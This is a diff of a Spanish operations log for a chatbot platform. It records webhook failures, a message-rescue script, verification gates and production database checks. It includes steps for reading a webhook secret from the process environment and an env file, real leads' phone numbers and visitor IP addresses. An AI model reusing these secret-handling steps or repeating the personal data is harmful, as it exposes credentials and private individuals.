@@ -81,7 +81,7 @@ contacto)** — estas dos últimas no estaban contadas en ningún lado. De las s
 dejaron teléfono ni correo**: sólo se les puede contestar DESDE el widget, que es exactamente
 lo que el inbox huérfano impide. La decisión §9 sigue en pie (opción 1, dejar el 4 sin dueño
 "hasta que la limitación moleste") pero el propio dato que le faltaba a esa condición ya
-está: **S12** en Bloqueado.
+está: **S14** en Bloqueado.
 
 ---
 
@@ -107,7 +107,49 @@ npm run deploy:alcanzable
 Saca los commits de `onia-platform` que esta cola nombra y le pregunta a git si `origin/master`
 —la rama de la que se buildea— los alcanza. Nace de que la misma fila (**S11**) falló tres veces:
 el commit no existía, después existía sin estar mergeado. **Un párrafo que lista commits
-envejece; esto no.** Hoy sale **1** por **S16**.
+envejece; esto no.** Hoy sale **0**: los 4 commits declarados llegan a `origin/master`. Fue el
+gate el que destapó que **S16 había vencido** — ver el primer ítem de "Cerrado".
+
+**Y ningún bloqueo le pide a Sergio algo que ya está resuelto:**
+
+```bash
+npm run bloqueos:vencidos
+```
+
+Corre el verificador que cada fila de "Bloqueado en Sergio" declara con la marca
+`**Verificador:** \`<comando>\` → <código>`, y sale **1** nombrando las que ya están
+satisfechas. Nace de que S16 declaraba el suyo y **ninguna vuelta lo corría**: venció en
+silencio y se destapó de casualidad, ya vencido, adentro de una auditoría de los `[x]`.
+Sólo ejecuta `npm run <script de package.json>` o `node <ruta del repo>`, siempre sin shell:
+un gate que corre texto arbitrario sacado de un documento es peor que el problema que tapa.
+Hoy sale **0** — S9 y S10 medidos vivos, los dos siguen bloqueados.
+
+**Y la bandeja del objetivo no se da vuelta sola sin que nadie se entere:**
+
+```bash
+npm run inbox:tenencia
+```
+
+Le pregunta a la base de producción quién es dueño de cada inbox de Chatwoot. Sale **0** si
+`Onia (interna)` tiene el inbox 5 —la tenencia que S8 dejó cerrada, y la única columna que
+decide qué muestra `/inbox`— y **1** si se movió o si dos orgs reclaman el mismo inbox. Nace de
+que **ya se dio vuelta una vez**, a las 02:02 del 1-sep, por un mecanismo que sigue sin
+identificarse: la fila se borró y se re-creó por fuera de la app apuntando al inbox 4, y con eso
+**S7 quedó roto sin que la cola lo supiera**. El ítem que lo arregló se cerró dejando escrito su
+propio comando de verificación —y a nadie que lo corriera—, que es el molde con el que S16
+venció en silencio. Hoy sale **0**.
+
+**Y el objetivo del carril se comprueba solo, entero y por HTTP:**
+
+```bash
+npm run objetivo:visible
+```
+
+Genera una sesión del dueño real de la bandeja (preguntado a la base, no hardcodeado), llama a
+`/api/bandeja` contra el host público y sale **0** si ahí hay alguien que no somos nosotros.
+Es el ÚNICO gate que mide el objetivo y no una pieza suya: `inbox:tenencia` mide la columna, que
+es el primer eslabón de cinco, y **los otros cuatro fallan devolviendo 200 con la lista vacía**.
+Hoy sale **0** — mariohassen y F, por el camino completo.
 
 **Nunca:** desplegar al VPS sin OK de Sergio · tocar otro carril (web-factory es dueño de
 `web-factory/`, producto de la cola de plataforma) · gastar plata · bajar una superficie viva.
@@ -116,32 +158,449 @@ envejece; esto no.** Hoy sale **1** por **S16**.
 
 ## Ahora
 
-> **Ahora está vacío el 2026-09-02.** El único ítem que tenía —vigilar que el reconcile
-> nocturno de Chatwoot no revierta el branding— se movió entero a "Bloqueado en Sergio" como
-> **S10**: ya medía lo mismo desde el 31-ago (ocho vueltas seguidas con el mismo veredicto) y
-> lo único que falta es un `scp` al VPS, que sólo Sergio puede autorizar. Reverificado ANTES
-> de moverlo, no de memoria: `npm run marca:chatwoot` contra producción sigue en
-> `REVERTIDAS 3/9` (`BRAND_URL`, `TERMS_URL`, `PRIVACY_URL`) — el bloqueo está **vivo, no
-> vencido**. Vuelve a "Ahora" el día que el gate cambie de veredicto.
+- [ ] 🔴 **Un mensaje que llega mientras el webhook está caído se pierde PARA SIEMPRE, y pasa
+      una vez por día.** Abierto el 2026-09-03 **por el chequeo de arranque, no por la cola**:
+      `node scripts/sonda_widget.mjs` salió *"EL BOT SE QUEDO MUDO — conversacion 49: #1 → 0
+      respuesta(s) · #2 → 1 respuesta(s)"*.
+      🔴 **La causa NO es el motor, y por eso una semana de diagnóstico miró el lugar equivocado.**
+      Los tres relojes, medidos en vivo y pegados uno al lado del otro:
+      `docker inspect onia-center --format '{{.State.StartedAt}}'` → **00:03:32** (el contenedor
+      reinició) · mensaje **282** entrante **00:03:52**, sin respuesta jamás ·
+      `/var/log/onia-bot-watchdog.log` **00:04:01** *"el webhook NO responde en :3020 —
+      reiniciando"* · mensaje **283** entrante **00:04:08** → contestado a las **00:04:12**.
+      El proceso del webhook cuelga de `docker exec -d` sobre `onia-center`: cuando el contenedor
+      reinicia, se va con él. El watchdog lo levanta, pero tarda **hasta 2 minutos** — y en esa
+      ventana Chatwoot ya disparó su **único** webhook contra un puerto muerto. **Chatwoot no
+      reintenta.** El mensaje no se contesta nunca y nadie se entera.
+      **No es raro: 20 reinicios del webhook entre el 28-ago y el 3-sep** (contados en
+      `/tmp/onia-bot-webhook.log` dentro del contenedor). Cada uno es una ventana en la que un
+      desconocido puede escribir y quedar colgado. Es el modo de falla escrito del carril —el
+      primer mensaje anda, muere el segundo— pero **por debajo del motor**: el motor nunca se entera.
+      **Construido y probado: `hermes-content/deploy/vps-ops/bot/rescate-run.mjs`** + sus 13
+      casos (`hermes-content/deploy/vps-ops/bot/rescate-run.test.mjs`, **13/13**, rojo primero por `Cannot find module`). Pregunta
+      quién escribió y sigue sin respuesta, y **reinyecta ese mensaje por el MISMO webhook con el
+      MISMO payload de Chatwoot**. Reinyectar es seguro y eso es lo que lo hace barato: el
+      `message_key` que arma es `chatwoot:<conv>:<msgId>`, **idéntico** al del webhook en vivo, así
+      que si ya se procesó, `claimInbound` (unique en `bot_messages.message_key`) lo corta antes
+      del motor — reinyectar de más da un *skip*, no una segunda respuesta.
+      **Medido contra producción, no contra el test:** `node rescate-run.mjs` (seco) →
+      *"conv 47 msg 249 — 427 min sin respuesta — «Tengo una clinica dental en Santa Cruz, somos 4
+      personas»"*. **Encontró un huérfano real que nadie había visto.** La selección funciona.
+      🔴 **Lo que FALTA, y es la última milla — 401:** `node rescate-run.mjs --emit` →
+      `wget: server returned error: HTTP/1.1 401 Unauthorized`. El webhook autentica
+      (`hermes-content/deploy/vps-ops/bot/webhook-security.mjs`) y la reinyección no va firmada. **Reproducción en 30 s:** correr ese
+      comando. **El camino más corto está identificado, no hay que investigarlo de nuevo:** el
+      `authenticateChatwootRequest` acepta **secreto en la ruta** (`/webhook/chatwoot/<secreto>`,
+      `verifyPathSecret`, línea 122) además de la firma HMAC. El secreto **no** está en el env del
+      proceso (`cat /proc/<pid>/environ` sólo trae `ONIA_WEBHOOK_PORT`): vive en el archivo que
+      apunta `ONIA_WEBHOOK_ENV_FILE` en `hermes-content/deploy/vps-ops/bot/webhook-server.sh`. Leerlo de ahí y agregarlo a la URL de
+      `postAlWebhook` cierra el ítem.
+      ⚠️ **Y falta desplegarlo**: `/opt/onia/bot` es rsync, no git. Commiteado, **NO desplegado**.
+      ⚠️ **De paso, medido: el log por mensaje que esta cola da por cerrado NO está corriendo.**
+      `/opt/onia/bot/webhook-server.mjs` es del **29-ago** y tiene **cero** llamadas a `traza(`;
+      el del repo tiene 2. Por eso `/tmp/onia-bot-webhook.log` sigue teniendo **sólo** líneas de
+      arranque. El ítem de abajo es honesto (dice "commiteado"), pero mientras no se despliegue el
+      loop sigue diagnosticando a ciegas — que es exactamente lo que costó la semana.
 
-> 🧹 **Podadas acá tres notas del 2026-09-02 que se contradecían entre sí** (2026-09-02, vuelta
-> de la auditoría de los `[x]`). Una afirmaba que `verificar_cola.js` **sale 0** y otra que
-> **sale 1**; medido antes de podar, sale **1** (`cola-vacia`). Una frase viva que declara verde
-> un gate que está rojo es la anestesia exacta que esta cola denuncia dos párrafos más abajo:
-> la próxima vuelta que viera el rojo lo iba a descartar como conocido. Las otras dos sólo
-> narraban mudanzas ya reflejadas en **S9** y **S10**. La historia vive en el `git log`; acá
-> queda **una sola** nota vigente, la de abajo.
+- [x] 🔴 **La sonda reusa UNA conversación para siempre, así que desde la segunda vuelta ya no
+      mide "un desconocido escribe dos veces": mide una charla con ocho turnos encima.**
+      **CERRADO el 2026-09-02.** La causa medida no era la que este ítem suponía, y la diferencia
+      importa: no es que la conversación "crezca" y confunda a la sonda por largo — es que llega a
+      un estado donde **el bot calla POR DISEÑO**. Prueba, no hipótesis:
+      `select bot_stage, human_took_over from onia_center.bot_conversations where
+      conversation_key='chatwoot:49';` → **`handoff_humano|f`**. El motor lo silencia en
+      `hermes-content/deploy/vps-ops/bot/bot-engine.mjs:459` y en el `case "handoff_humano"` de la 591, que es lo CORRECTO: el bot
+      derivó a Sergio. La sonda gritaba "EL BOT SE QUEDO MUDO" con el bot sano — a las 20:19 y a
+      las 21:09 del mismo día había contestado los dos turnos.
+      **Ojo con la base equivocada:** en Chatwoot la conversación 49 figura `open` y perfectamente
+      sana. El estado que calla vive en OTRA base (`onia_center.bot_conversations` del
+      `supabase-db`). Mirar sólo Chatwoot es lo que mantuvo este bug invisible.
+      **El arreglo — desarmar antes de medir**, con su caso en rojo primero
+      (`necesitaDesarme is not defined`, 21/25) y verde después (25/25). No inventa un camino:
+      usa el que el producto ya define — `clearHumanTakeover` (mismo archivo, línea 117) dice *"resolver significa terminé"* y
+      devuelve `handoff_humano` a `nuevo`. Se resuelve **por Rails** para que corra el camino real
+      (Chatwoot emite `conversation_status_changed` → el adapter lo traduce), así cada vuelta
+      verifica de paso que ese desarme sigue vivo. Medido en vivo: `resolved` → **4 segundos** →
+      `bot_stage=nuevo`.
+      **Falla hacia el 2, nunca hacia el 1:** si el desarme no devuelve la conversación, la sonda
+      dice "NO SE PUDO MEDIR", no "el bot está mudo". Confundir esas dos cosas es exactamente lo
+      que costó esta vuelta.
+      **Verificación final:** `node scripts/sonda_widget.mjs` → **exit 0**, *"EL BOT CONTESTO LOS 2
+      — conversacion 49"*. Antes del arreglo, mismo comando: exit 1, 2 de 2 sin respuesta.
+      ⚠️ **La corrección que este ítem proponía (resolver para que se abra una conversación NUEVA)
+      no es lo que pasó:** medido, el widget siguió escribiendo en la **49**. Alcanza igual, porque
+      lo que había que resetear era el estado del motor, no el hilo. Anotado para que nadie
+      "arregle" después el hecho de que la conversación no se renueve.
+      <!-- Diagnóstico original, conservado: llegó a la causa correcta a medias -->
+      Medido hoy
+      2026-09-02, no supuesto — y es un **falso rojo**, el peor defecto posible en el instrumento
+      que decide si el carril está roto. Archivo: `scripts/sonda_widget.mjs`.
+      **Reproducción exacta, 2 minutos:** `node scripts/sonda_widget.mjs` dos veces seguidas. La
+      primera salió **0** (21:09:04 y 21:09:19, las dos contestadas: mensajes 264→265 y 266→267);
+      la segunda, **40 segundos después**, salió **1** — mensaje **270** (21:09:59) sin respuesta
+      **90 s después**, verificado en la base, no por timeout de la sonda:
+      `docker exec <chatwoot-db> psql -U postgres -d onia-chatbot -tAc "select id, message_type,
+      created_at, left(content,70) from messages where conversation_id=49 order by created_at;"`
+      **Por qué NO es el bug del bot.** En esa tercera repetición el bot ya venía de contestar
+      *"¿En qué horario te viene mejor…"* y *"Eso lo tiene que ver Sergio, no yo"*: la máquina de
+      estados está a ocho turnos de la bienvenida. Ningún lead de verdad llega ahí en su segundo
+      mensaje. La sonda está juzgando un estado conversacional que su propia definición de hecho
+      no describe.
+      **De dónde viene:** la conversación se reusa para esquivar el tope de 5 aperturas/hora, y esa
+      decisión —correcta contra el 429— arrastró un efecto que nadie midió: la conversación **crece**
+      y el estado del bot se va con ella.
+      **El dato que hace barata la corrección, medido hoy:** el inbox 4 tiene
+      `lock_to_single_conversation = f` (`select id, name, lock_to_single_conversation from
+      inboxes where id in (4,5);` → `4|Onia Web|f`). O sea que **resolviendo** la conversación
+      antes de medir, el próximo mensaje del widget abre una **nueva** — conversación fresca cada
+      vuelta, sin tocar el throttle, porque el token se sigue firmando por Rails
+      (`guionBootstrap`), que nunca pasa por `/widget`. Es un `update` de estado en el guión de
+      Rails que ya existe, más su caso en rojo primero.
+      ⚠️ **No confundir con "arrancar de cero cada vez":** un contacto nuevo por vuelta ensucia el
+      inbox 4, que es donde viven los leads de verdad (ya pasó: 12 contactos anónimos el 2026-09-02).
+      El contacto se reusa; lo que se renueva es la conversación.
 
-> **"Ahora" quedó vacío el 2026-09-02**, y esta vez no es una frase de trámite: el ítem que
-> tenía se **cerró** (el primero de "Cerrado", con su evidencia), y lo único que le quedaba
-> era una credencial ⇒ se fue a **S15**. Los tres de "Después" están frenados por algo que no
-> es código: el disco es de la máquina de Sergio y el ítem mismo dice *"no la arregla este
-> carril"*; la limpieza de QA dice *"no borrar todavía"*; y el botón QR espera al BCP (**S2**).
-> Por eso `verificar_cola.js` sale **1** con `cola-vacia` — **es el gate diciendo la verdad**,
-> y se deja rojo a propósito. No se destraba promoviendo uno de "Después": ninguno de los tres
-> está desbloqueado, y moverlo sólo para ver verde es fabricar trabajo. Lo destraba **S15**.
+- [x] **El chequeo de "hecho" de este carril funcionó UNA sola vez en su vida, y el arreglo
+      anterior es el que lo garantizó.** Hecho el 2026-09-02. Archivo: `scripts/sonda_widget.mjs`.
+      **Gate 1: el ítem era REAL y salió del propio chequeo de arranque**, no de la cola —
+      `node scripts/sonda_widget.mjs` daba **exit 2**, `Timeout 30000ms … waiting for
+      locator('#chat-input')`. La vuelta anterior había cerrado la sonda declarándola viva, y lo
+      estaba: la conversación **49** existe con sus dos turnos contestados (mensajes 257-263,
+      20:19-20:20). Midió una vez y no volvió a medir nunca.
+      🔴 **Las dos causas, MIRADAS renderizadas con Chromium — ninguna era la que decía el error.**
+      **(1) El botón cambia de rótulo.** Para esquivar el tope de 5 aperturas/hora la sonda entra
+      con `cw_conversation` y **reusa su conversación** — y con conversación ya empezada Chatwoot
+      rotula el botón **"Continuar conversación"**, no "Iniciar conversación", que era lo único que
+      el localizador buscaba. O sea que el arreglo del 429 **se saboteó a sí mismo**: la primera
+      vuelta (contacto recién creado, sin conversación) decía "Iniciar" y anduvo; **todas las
+      siguientes decían "Continuar" y morían**. Es exactamente el modo de falla que este carril
+      tiene escrito — *un chequeo que mira el primer paso no ve un sistema que muere en el segundo*—
+      esta vez adentro del chequeo mismo.
+      **(2) Y aun clickeando por rótulo correcto, no alcanzaba: no había a quién clickear todavía.**
+      `goto` vuelve con `domcontentloaded` y en ese instante el Vue del widget **no dibujó nada**:
+      `document.querySelectorAll('button')` devuelve **cero**. La sonda no clickeaba, esperaba 30 s
+      una caja que no se iba a montar, y el mensaje de Playwright no decía ni una palabra de esto.
+      Con 6 s de espera los dos botones están y el clic funciona.
+      **Qué se construyó.** `elegirArranque()` —pura y exportada— elige el botón **por estructura y
+      no por rótulo**: descarta el de cerrar y los sin texto, y entre los que quedan prefiere el que
+      habla de la conversación. Sobrevive a "Continuar", a un cambio de idioma y al próximo cambio
+      de copy. Más un bucle que **espera a que el widget monte** antes de mirarle los botones, y un
+      diagnóstico que, si igual no aparece `#chat-input`, imprime **los botones y el texto de la
+      pantalla**. Eso último no es adorno: esta misma falla costó una vuelta de diagnóstico a
+      ciegas —se supuso un iframe que no existe, y después un rótulo que había cambiado— y el
+      mensaje nuevo la resuelve en 5 segundos.
+      **Rojo primero y por el motivo correcto.** Los 6 casos nuevos se corrieron contra la semántica
+      vieja (la que estaba viva): **3 en rojo**, y el principal falló con **su propia** aserción —
+      *"con «Continuar conversación» hay que clickear igual: es el mismo botón con otro rótulo"*.
+      Los DOM de los casos son **reales**, leídos del widget de producción con Chromium: el de una
+      vuelta cualquiera (`["…close-button", "Continuar conversación"]`) y el de la primerísima
+      (`"Iniciar conversación"`). Los otros 3 son guardas: que no se arregle el caso 2 rompiendo el
+      1, que **nunca** se clickee el botón de cerrar (cerraría el panel, con un síntoma idéntico al
+      bug de hoy) y que la lista vacía dé -1 = *esperar*, no *no hay botón*.
+      **Verificado en vivo, y verificado DOS veces a propósito** — que funcione una vez es
+      justamente lo que ya pasaba: primera corrida **exit 0**, *"EL BOT CONTESTO LOS 2 —
+      conversación 49"*; segunda corrida seguida, **midió otra vez** (dio 1, y ese 1 es el ítem
+      abierto de arriba: la sonda mide, pero desde la vuelta 2 mide otra cosa).
+      **Gates:** `npm test` completo en verde (exit 0), con `test:sonda-widget` **21/21**.
+
+- [x] **El bot no dejaba NI UNA línea por mensaje, y por eso el bug de "contesta una vez y se
+      calla" sobrevivió una semana con cinco personas reales del otro lado.** Hecho el 2026-09-02.
+      Archivos: `hermes-content/deploy/vps-ops/bot/webhook-server.mjs` y
+      `hermes-content/deploy/vps-ops/bot/webhook-server.test.mjs`.
+      **Medido en vivo, no leído:** `/tmp/onia-bot-webhook.log` **dentro del contenedor
+      `onia-center`** (en el host no existe: el bot corre con `docker exec -d`) tenía **2,5 MB y
+      su última escritura era `2026-09-02T17:19:49Z`, la del arranque** — mientras la conversación
+      **48** recibía mensajes a las 17:21:35 y 17:21:54. Cero líneas por webhook. La causa: el
+      servidor **ya recibía** un `log`, pero sólo lo llamaba en dos errores raros (socket muerto y
+      n8n); el camino del webhook no escribía nunca. **Un log que existe y no se llama es peor que
+      no tenerlo, porque aparenta diagnóstico.**
+      **Qué se construyó.** `formatearTraza()` (pura) + una `traza` que sale de **todas** las
+      ramas de `handleChatwootWebhook`. Una línea por webhook con conversación, mensaje, entrada,
+      etapa `antes->después`, el conteo de publicados sobre producidos y **el motivo**. Las tres ramas
+      mudas se nombran distinto porque las tres devuelven 200 con cuerpos casi iguales y a ojo se
+      leen como éxito: **`MUDO`** (el turno corrió y no produjo nada — el bug de la semana),
+      **`NO_ENTREGADO`** (produjo respuesta y Chatwoot la rechazó — los cuatro días de agosto con
+      `/health` en verde) e **`ignorado`**. Más `repetido`, `ERROR`, `rechazado` (auth: la rama que
+      hay que ver cuando "no llegan los webhooks") y `respondio`.
+      **La traza se arma envolviendo el pipeline, no en cada `return`.** Hay **nueve** salidas: la
+      propiedad "todo webhook deja una línea" se rompe sola en cuanto alguien agregue la décima.
+      Envolviendo, no hay forma de salir sin traza — y hay un test que lo exige en las ramas feliz,
+      skip y auth.
+      **Rojo primero y por el motivo correcto.** Los 7 casos nuevos se corrieron contra un stub que
+      devolvía `""`, así que cada uno falló en **su propia** aserción, no por un error de módulo.
+      **Y probado que MUERDE:** dos mutaciones, las dos rojas — `MUDO`→`respondio` (2 casos) y el
+      servidor volviendo a **no** loguear, que es el estado de hoy en producción (1 caso).
+      **Gates:** `npm run test:bot` **704/704** en verde (31 en este archivo, 7 nuevos).
+      🔴 **COMMITEADO, NO DESPLEGADO.** `/opt/onia/bot` no es un checkout de git y el deploy no es
+      de este carril. **Hasta que alguien copie el archivo y reinicie el bot, el log sigue ciego.**
+
+- [x] 🔴 **El arreglo que hoy hace que el bot conteste dos veces está VIVO en producción y NO
+      está en el repo: un `rsync` desde Windows lo borra y el bug de la semana vuelve.**
+      Hecho el 2026-09-02. Archivos: `hermes-content/deploy/vps-ops/bot/bot-engine.mjs`,
+      `hermes-content/deploy/vps-ops/bot/config.mjs` y
+      `hermes-content/deploy/vps-ops/bot/knowledge.test.mjs`.
+      **Gate 1 corrido, y el ítem era REAL:** el `diff` normalizado daba **25** líneas en
+      `bot-engine.mjs` y **12** en `config.mjs` al empezar la vuelta. Ahora los dos dan **0** —
+      el mismo comando que lo probó es el que lo cierra.
+      🔴 **Lo que encontró el test que faltaba: el bug estaba blindado por su propio test.**
+      `knowledge.test.mjs:487` **exigía** `botStage === "handoff_humano"` con el mensaje *"queda a
+      cargo de un humano, no esperando una elección imposible"* — y `handoff_humano` es la barrera
+      que devuelve **cero** respuestas para siempre (`bot-engine.mjs`, `case "handoff_humano"`).
+      O sea: el test verificaba que el mensaje de bienvenida fuera correcto **y exigía el estado
+      que hace callar al bot**. Verde, y la conversación moría en el segundo mensaje. Copiar los
+      dos archivos sin tocar esa línea habría dejado el gate en rojo y el arreglo pareciendo un
+      error.
+      **Rojo primero y por el motivo correcto.** El test nuevo —*"sin horarios el bot sigue vivo en
+      el SEGUNDO mensaje"*— corrió **antes** del arreglo y falló con su propia aserción:
+      `el bot NO puede quedarse mudo en el segundo mensaje`. No falló por un módulo ni por una
+      importación: por la propiedad que importa. Encadena dos turnos con `DEFAULT_CONFIG` (los
+      slots reales de producción, en "pendiente de definir"), que es la única forma de ver un
+      sistema que muere en el segundo turno.
+      **Y probado que MUERDE: dos mutaciones, las dos rojas.** `botStage` de vuelta a
+      `handoff_humano` → **2** casos rojos (el nuevo y el corregido); `M0b_SIN_HORARIOS` borrado
+      → **1** rojo, por el placeholder *"HORARIO A (pendiente de definir)"* llegándole al
+      prospecto.
+      **Gates:** `npm run test:bot` **705/705** en verde (1 caso nuevo, 1 aserción corregida).
+      ⚠️ **`config.mjs` se dejó byte a byte igual a producción, orden de claves incluido**
+      (`M0b_SIN_HORARIOS` **antes** de `M0b`, con los dos bloques de comentario apilados). Se
+      probó al revés primero y el `diff` daba **14** líneas de puro orden: el chequeo del ítem
+      habría seguido gritando con el arreglo ya versionado, que es exactamente el fantasma que
+      esta cola mide. Un orden más lindo no vale un gate ambiguo.
+      **Esto NO despliega nada**: producción ya tenía el arreglo — lo que faltaba era la copia
+      versionada que impide que un `rsync` desde Windows lo borre. El sentido del ítem era el
+      inverso al habitual: acá el repo iba **atrás** de producción.
+
+- [x] **El objetivo del carril se daba por cumplido leyendo un párrafo del 31-ago, y las cuatro
+      formas en que puede romperse devuelven 200 con la lista vacía.** Hecho el 2026-09-02,
+      auditando los `[x]` (nivel 2 de la escalera: "Ahora" no tenía ítems sin empezar y los tres de
+      "Después" no son promovibles). Archivos: `scripts/objetivo_visible.mjs` (nuevo), `package.json`.
+      **Gate 1 primero, y el `[x]` auditado resultó CIERTO hoy** — el ítem *"CERRADO el 2026-08-31
+      (novena vuelta): hay dos desconocidos en `/inbox` de producción"*. Medido por el camino real,
+      no leído: sesión del dueño → `GET https://app.onia.com.bo/api/bandeja` → **200**,
+      `sinCanal:false`, tres conversaciones — **#37 mariohassen (+59173021804)** y **#35 F
+      (+59173232758)**, más la #11 de Sergio, que es nuestra. El objetivo del carril sigue vivo.
+      🔴 **Lo que NO estaba, y es el ítem: nada lo comprobaba.** `inbox:tenencia`, construido la
+      vuelta anterior, mide `clinic_settings.chatwootInboxId` — el **primer eslabón de cinco**.
+      Entre esa columna y el ojo del dueño hay cuatro capas más, y **tres fallan mudas**, con un
+      200 indistinguible del éxito: la org sin inbox (`200 {sinCanal:true}`), el token de Chatwoot
+      del contenedor sin membresía en el inbox (`200 {conversaciones:[]}`), y `esDeInbox` filtrando
+      todas las filas (igual). La capa del token no es hipotética: **esta misma cola la nombra**
+      *"exactamente el fantasma que este carril mide"*, y se comprobó a mano UNA vez, el 31-ago.
+      **Y la receta para volver a mirarlo vivía sólo en la prosa de ese ítem cerrado**
+      (`generate_link` → `verify` → cookies con `@supabase/ssr`) — el mismo molde con el que **S16
+      venció en silencio** y **S11 se comprobaba a mano**. Ahora es ejecutable.
+      **Qué se construyó.** `npm run objetivo:visible` sale **0** si la bandeja del dueño trae al
+      menos una conversación de alguien que no somos nosotros, **1** si el objetivo se rompió
+      (nombrando cuál de las cuatro capas), **2** si no pudo medir. No hardcodea al dueño: le
+      pregunta a la base **quién** tiene el inbox 5 y entra como esa persona, así que si la bandeja
+      cambia de org el gate sigue midiendo al dueño real. Y no hardcodea a mariohassen: exige
+      "≥1 que no somos nosotros", porque un gate que exige un nombre se muere el día que esa
+      conversación se borra.
+      **Probado que MUERDE, y ahí aparecieron cuatro casos que pasaban en falso.** Siete mutaciones
+      al veredicto, las siete rojas (2 a 9 casos cada una). Las mutaciones destaparon que
+      `codigo === 1` **no alcanzaba** para `sinCanal` ni para la lista vacía: apagando cualquiera de
+      esas ramas el flujo cae igual en "SOLO NOSOTROS", que también es 1 — o sea que el caso pasaba
+      con la rama rota. Se afirma el **diagnóstico**, no sólo el código: un rojo por el motivo
+      equivocado manda a mirar el archivo equivocado. Lo mismo con el 502, que sin su rama caía en
+      "200 sin array" y devolvía 2 igual. Y el caso del `\b` del regex estaba mal elegido:
+      `"Prudencia"` no contiene `"prueba"`, así que pasaba con el regex aflojado — reemplazado por
+      el apellido real **`Testa`**, que sí contiene `test`. **Un caso que no puede fallar no es un caso.**
+      **Las cuatro salidas en vivo, contra producción:** real → **0**; host que no es el producto →
+      **2**; contenedor de base inexistente → **2**; sin `@supabase/ssr` → **2**.
+      ⚠️ **Sólo lectura, y con dos cuidados que no son adorno:** nunca abre una conversación (eso la
+      marcaría como leída en el Chatwoot de gente real), y **nunca hace `signOut`** — el perfil del
+      dueño es el mismo que usa Sergio y un signOut global lo sacaría de su propia sesión.
+      **Gates:** `npm test` completo en verde, con `test:objetivo-visible` (30 casos) cableado a la
+      cadena — verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
+      existen y NO los corre nadie: test:objetivo-visible"* antes de cablearlo.
+
+- [x] **La bandeja del objetivo ya se había dado vuelta sola una vez, y lo único que la vigilaba
+      era un comando escrito en un párrafo.** Hecho el 2026-09-02, auditando los `[x]` (nivel 2 de
+      la escalera: "Ahora" no tenía ítems y los tres de "Después" no son promovibles).
+      Archivos: `scripts/inbox_tenencia.mjs` (nuevo), `package.json`.
+      **Gate 1 primero, y el `[x]` auditado resultó CIERTO hoy:** `Onia (interna)` sigue con el
+      inbox 5 — medido en `supabase-db`, no leído, con `updatedAt = 2026-09-02 05:09:11`, que es
+      el `UPDATE` de la restauración (su commit `fc58f298` es de las 05:11:18). Nadie lo volvió a
+      tocar. Pero ese ítem se cerró **declarando su propio agujero**: *"ningún gate de este carril
+      mide hoy la tenencia del inbox 5… se deja escrito el comando de verificación para el próximo
+      Gate 1"*. Un comando parado en un documento es el molde exacto con el que **S16 venció en
+      silencio** y con el que **S11 se comprobaba a mano**. Ahora es ejecutable.
+      **Qué se construyó.** `npm run inbox:tenencia` le pregunta a la base de producción quién es
+      dueño de cada inbox de Chatwoot. Sale **0** si `Onia (interna)` tiene el 5, **1** si la
+      tenencia se movió, **2** si no pudo medir (no medir no es estar bien). Importa más que los
+      otros tres gates del carril: `espejo-check`, `campanas-vivas` y `marca-chatwoot` miden código
+      y HTML público; **éste mide la única columna que decide si el objetivo se ve** — `/inbox`
+      filtra por `clinic_settings.chatwootInboxId` y sólo por esa (`lib/chatbot/bandeja-auth.ts:22`).
+      **Rojo por el motivo correcto, y contra bytes VIVOS.** Se leyó producción de verdad y a esa
+      salida real se le aplicó el revert del 1-sep: sale 1, dice *"debería tener el inbox 5 y tiene
+      el 4"* y agrega la pista forense que la propia cola manda mirar — el `id` de la fila es un
+      UUID y no el `cuid()` que genera la app, o sea que se escribió **por fuera**.
+      🔴 **El id UUID se reporta pero NO es el veredicto, y esa distinción es el ítem.** Hoy la fila
+      **buena** también tiene id UUID (`ab6e629f-…`): la restauración fue un `UPDATE` sobre la fila
+      que dejó el mecanismo desconocido, no una fila nueva. Un gate que se pusiera rojo por el
+      formato del id estaría rojo para siempre con la tenencia correcta — el mismo modo de falla
+      que `scripts/s11_desplegado.mjs` ya documenta.
+      🔴 **Y apareció un segundo invariante que nadie había medido: la base NO impide que dos orgs
+      se queden con el mismo inbox.** `chatwootInboxId` es `Int?` **sin `@unique`**
+      (`prisma/schema.prisma:1002`), y `ClinicSettings` tampoco tiene `@@unique` sobre esa columna:
+      el 409 que evita la colisión vive **sólo en la app**, en el PATCH de superadmin — y la
+      escritura que rompió esto la primera vez no pasó por la app. Dos orgs sobre un inbox se ven
+      las conversaciones entre sí. El gate lo detecta y lo nombra.
+      **Gates:** `npm test` completo en verde, con `test:inbox-tenencia` (22 casos) cableado a la
+      cadena — y verificado **en rojo primero**: `test:guards-cableados` mordió con *"estos tests
+      existen y NO los corre nadie"* antes de cablearlo.
+
+- [x] 🔴 **El chequeo de "hecho" de este carril no se podía ejecutar — y el diagnóstico escrito
+      de por qué era FALSO.** Hecho el 2026-09-02. Archivos: `scripts/sonda_widget.mjs` (nuevo),
+      `package.json`.
+      **Gate 1 corrido, y el ítem era REAL**, pero su causa no era la anotada. Acá decía que el
+      localizador expiraba *"probablemente dentro de un iframe, o montada recién al abrir el
+      panel"*. Medido: **no hay iframe** (`page.frames().length === 1`) y el selector es
+      `#chat-input` (el `ChatInputWrap` del widget, linea 139 — vive dentro del contenedor de Chatwoot, no en este repo). Lo que pasaba es
+      que la página **nunca cargaba**: `GET /widget?website_token=…` devuelve **HTTP 429 `Retry
+      later`**. La regla, textual, en el `rack_attack` de Chatwoot (initializer del contenedor, no de este repo):
+      `throttle('widget?website_token=…', limit: 5, period: 1.hour)` `if req.path == '/widget' &&
+      params['cw_conversation'].blank?`. **Abrir el widget sin traer conversación son 5 veces por
+      hora y por IP.** Una sonda horaria que abre limpio se apaga sola y encima se come el cupo.
+      La hipótesis del iframe no era sólo inútil: mandaba a arreglar el archivo equivocado.
+      ⚠️ **Los leads reales NO están afectados, y se verificó en vez de suponerse.** El contador es
+      por IP y Chatwoot ve la IP real de cada visitante: en su log conviven `181.115.161.191`,
+      `189.28.94.168`, `181.188.170.59` (ISPs bolivianos) y `187.77.16.63`, que es este VPS. **El
+      único bloqueado era el bloqueador: nosotros.**
+      **La salida es `cw_conversation`.** `WidgetsController#set_token` decodifica ese parámetro,
+      busca el `ContactInbox` por `source_id` y reusa el contacto — y el throttle **no aplica**
+      cuando el parámetro viene. La sonda guarda su token la primera vez y después entra siempre
+      por la puerta libre. Efecto de borde deseado: hay **una sola** conversación de sonda, no una
+      por hora ensuciando la bandeja donde viven los leads de verdad.
+      **`npm run sonda:widget`** sale **0** si el bot contestó los DOS mensajes, **1** si contestó
+      uno o ninguno, **2** si no pudo medir. El `conversation_id` sale del `source_id` del propio
